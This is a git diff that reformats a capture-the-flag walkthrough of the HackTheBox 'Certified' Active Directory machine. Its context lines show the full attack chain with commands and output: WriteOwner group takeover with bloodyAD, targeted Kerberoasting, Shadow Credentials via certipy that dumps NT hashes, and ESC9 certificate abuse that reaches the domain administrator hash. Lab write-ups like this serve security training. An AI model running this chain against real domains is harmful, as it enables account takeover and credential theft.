@@ -3,12 +3,14 @@ title: "HackTheBox Certified Walkthrough"
 date: 2026-09-26 20:30:00 +0300
 categories: [HTB, HTB-AD]
 tags: [active-directory, writeowner, shadow-credentials, adcs, esc9, kerberoasting, bloodyad, certipy]
-
+image: /assets/img/certified/banner.png
 ---
 
 # Description :
 
 *Certified is a medium-difficulty Windows Active Directory machine set up as an assumed breach scenario. Starting with low-privilege credentials, we chain ACL misconfigurations to pivot through three accounts: abusing WriteOwner to take over a group, using GenericWrite for a Shadow Credentials attack, and exploiting an ESC9-vulnerable ADCS template to impersonate the domain administrator.*
+
+---
 
 ## Enumeration
 
@@ -39,6 +41,8 @@ nxc smb $TARGET --generate-hosts-file host
 cat host | sudo tee -a /etc/hosts
 ```
 
+---
+
 ### SMB (445)
 
 We validate our starting credentials and enumerate shares:
@@ -60,6 +64,8 @@ SMB         10.129.231.186  445    DC01             SYSVOL          READ        
 
 Standard DC shares, nothing interesting. With valid domain credentials, we check for misconfigured ACLs that could give us an escalation path.
 
+---
+
 ### BloodHound
 
 We collect AD data using RustHound:
@@ -74,7 +80,9 @@ BloodHound shows a direct attack chain from our starting user to `ca_operator`:
 JUDITH.MADER --WriteOwner--> MANAGEMENT [Group] --GenericWrite--> MANAGEMENT_SVC --GenericAll--> CA_OPERATOR
 ```
 
-![[bloodhound-chain.png]]
+![BloodHound Attack Chain](/assets/img/certified/bloodhound-chain.png)
+
+---
 
 ## Foothold: judith.mader → management_svc
 
@@ -116,7 +124,7 @@ bloodyAD --host 10.129.231.186 -u judith.mader -p judith09 add groupMember MANAG
 targetedKerberoast -v -d certified.htb -u judith.mader -p 'judith09'
 ```
 
-![[targeted-kerberoast.png]]
+![Targeted Kerberoast Output](/assets/img/certified/targeted-kerberoast.png)
 
 We get a TGS hash, but it doesn't crack against rockyou:
 
@@ -151,7 +159,9 @@ certipy shadow auto -target certified.htb -dc-ip 10.129.231.186 -username judith
 [*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584
 ```
 
-![[shadow-creds-mgmt-svc.png]]
+![Shadow Credentials - management_svc](/assets/img/certified/shadow-creds-mgmt-svc.png)
+
+---
 
 ## Lateral Movement: management_svc → ca_operator
 
@@ -180,7 +190,9 @@ certipy shadow auto -target certified.htb -dc-ip 10.129.231.186 -username manage
 [*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
 ```
 
-![[shadow-creds-ca-operator.png]]
+![Shadow Credentials - ca_operator](/assets/img/certified/shadow-creds-ca-operator.png)
+
+---
 
 ## Privilege Escalation: ca_operator → administrator (ESC9)
 
@@ -208,7 +220,7 @@ Certificate Templates
       ESC9                              : Template has no security extension.
 ```
 
-![[certipy-esc9-template.png]]
+![ESC9 Vulnerable Template](/assets/img/certified/certipy-esc9-template.png)
 
 The `CertifiedAuthentication` template is vulnerable to ESC9. The `NoSecurityExtension` flag means the certificate won't include the `szOID_NTDS_CA_SECURITY_EXT` OID (`1.3.6.1.4.1.311.25.2`), which is what the DC uses to map a certificate back to the requesting account's `objectSID`. Without this enforcement, the DC relies solely on the UPN in the certificate for identity mapping.
 
@@ -261,13 +273,6 @@ certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186
 [*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
 ```
 
-![[admin-hash.png]]
+![Administrator Hash Retrieved](/assets/img/certified/admin-hash.png)
 
 With the administrator's NT hash, we have full domain compromise.
-
-## References
-
-- [Certipy - AD CS Abuse (ESC9)](https://github.com/ly4k/Certipy)
-- [bloodyAD - AD Privilege Escalation](https://github.com/CravateRouge/bloodyAD)
-- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
-- [Targeted Kerberoasting](https://github.com/ShutdownRepo/targetedKerberoast)
